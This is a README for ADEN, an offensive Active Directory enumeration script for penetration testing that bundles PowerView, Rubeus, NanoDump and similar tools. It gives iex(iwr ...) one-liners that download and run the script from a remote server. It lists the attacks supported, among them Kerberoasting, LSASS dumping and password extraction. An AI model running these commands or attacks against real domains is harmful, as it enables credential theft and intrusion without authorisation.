## What is this?
ADEN is a local enumeration script for active directory environments, it is a carefully put together merge of several enumeration and exploitation projects:

- PowerView
- PowerMad
- ASREPRoast
- Get-GPPPassword
- PowerUpSQL
- New-GPOImmediateTask
- Invoke-Rubeus
- Invoke-NanoDump


It is to be used as an all-in-one enumeration script to use when you are in a domain user's session.\
\
Big credits to all the authors of the above mentioned tools! You are awesome.

## How to use?
If you are launching the script for the first time, the function ```Invoke-FullEnum``` is the recommended option as it will launch a full enumeration that will allow you to initially map the environment.\
\
From another domain user, the function ```Invoke-AdminEnum``` is recommended as it will launch only the relevant enumeration checks.
```powershell
iex(iwr -usebasicparsing http://[SERVER]/aden.ps1);Invoke-FullEnum
iex(iwr -usebasicparsing http://[SERVER]/aden.ps1);Invoke-AdminEnum
```
Keep in mind you also have access to all the functions of the above mentioned scripts. 

## What does it do?

ADEN currently supports the following attack scenarios:

- ASREPRoasting / Kerberoasting
- Unconstrained / Constrained / Resource Based Delegations
- LSASS Dumping
- Linked MSSQL Instances Abuse
- DACL Abuse
- Local Admin Access
- GPP / LAPS / LDAP Password exfiltration

It also enumerates the following, non-directly attack-correlated information:

- Current/Root Domain Info
- Current user memberships and privileges
- Kerberos and Password Policies
- Trust relationships
- Domain users, groups, computers, fileservers
